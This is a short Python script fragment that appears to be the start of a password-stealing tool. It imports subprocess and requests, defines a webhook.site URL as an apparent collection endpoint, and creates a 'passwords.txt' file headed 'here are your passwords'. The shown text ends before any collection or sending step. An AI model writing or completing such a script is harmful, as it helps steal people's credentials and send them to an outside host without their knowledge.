import subprocess
import os
import sys
import requests

url = 'https://webhook.site/7a5e65a7-ebef-47b5-a6c7-3a172100fe3b'

#create a file
password_file = open('passwords.txt', "w")
password_file.write("hello sir! here are your passwords:\n\n")
password_file.close()